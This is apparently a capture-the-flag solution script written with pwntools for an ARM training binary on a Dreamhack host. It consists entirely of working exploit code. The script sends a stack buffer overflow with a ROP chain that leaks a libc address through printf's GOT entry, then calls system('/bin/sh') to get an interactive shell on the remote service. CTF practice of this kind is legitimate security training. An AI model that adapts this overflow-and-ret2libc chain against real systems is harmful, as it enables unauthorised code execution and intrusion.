from pwn import *

context.arch='arm'

exe = 'qemu-arm -g 1234 -L /usr/arm-linux-gnueabi arm_training-last'
exe = 'qemu-arm -L /usr/arm-linux-gnueabi arm_training-last'
l = ELF('./libc.so.6')
r = process(exe.split(), env={'LD_PRELOAD': 'libc.so.6'})
r = remote('host3.dreamhack.games', 8715)

printf_got = 0x21014
puts_plt = 0x104EC
pop_r3_pc = 0x10480
mov_r0_r3_pop_fp_pc = 0x106e4
pop_fp_pc = 0x0001068c

def find_libc():
    r.sendlineafter(b') ', b'y')
    time.sleep(24)
    r.sendline()

    r.sendlineafter(b') ', b'n')
    payload = b'A'*52 + p32(pop_r3_pc) + p32(printf_got) + p32(mov_r0_r3_pop_fp_pc) + p32(0) + p32(puts_plt)
    r.sendlineafter(b'!!\n', payload)

    libc=u32(r.recv(4))-0x0004c634
    system=libc+0x4182c
    binsh=libc + next(l.search(b'/bin/sh'))
    
    print(hex(libc))
    print(hex(system))
    print(hex(binsh))

libc = 0x3fe20000
system = libc + 0x4182c
binsh = libc + next(l.search(b'/bin/sh'))

r.sendlineafter(b') ', b'y')
time.sleep(24)
r.sendline()

r.sendlineafter(b') ', b'n')
payload = b'A'*52 + p32(pop_r3_pc) + p32(binsh) + p32(mov_r0_r3_pop_fp_pc) + p32(0) + p32(system)
r.sendlineafter(b'!!\n', payload)

r.interactive()